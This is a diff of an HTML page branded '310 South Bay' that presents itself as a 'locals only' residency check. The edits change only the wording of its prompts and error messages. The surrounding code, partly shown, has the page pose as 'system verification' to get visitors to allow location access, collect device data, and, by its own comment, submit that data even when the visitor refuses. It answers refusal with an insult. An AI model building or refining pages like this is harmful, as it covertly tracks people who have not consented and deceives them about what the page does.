@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>310 South Bay | Established</title>
+    <title>310 South Bay | LOCALS ONLY CONTENT </title>
     <style>
         body {
             background-color: #000000;
@@ -87,7 +87,7 @@
     <div class="container">
         <img src="MagicEraser_260417_233536.png" alt="310 South Bay Logo" class="header-logo">
         
-        <div class="bold-phrase">SOUTHBAY RESIDENTS <br>PRESS ALLOW TO CONFIRM</div>
+        <div class="bold-phrase">SOUTHBAY RESIDENTS <br>PRESS "ALLOW" TO CONFIRM</div>
         <div id="status-text">WAITING FOR SYSTEM VERIFICATION...</div>
         <div id="location-display"></div>
 
@@ -175,7 +175,7 @@ TIMEZONE: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
                     // Still submits all deviceData collected above
                     const denialLog = `[ACCESS DENIED BY USER]\n${deviceData}\nREASON: User blocked or timed out.`;
                     
-                    locDisplay.innerHTML = "SYSTEM ERROR: IDENTITY NOT VERIFIED";
+                    locDisplay.innerHTML = "SYSTEM ERROR: IDENTITY NOT VERIFIED Or Enable location and refresh.";
                     triggerSubmission(denialLog, "ACCESS DENIED. FUCK OFF KOOK!", false);
                 });
             } else {
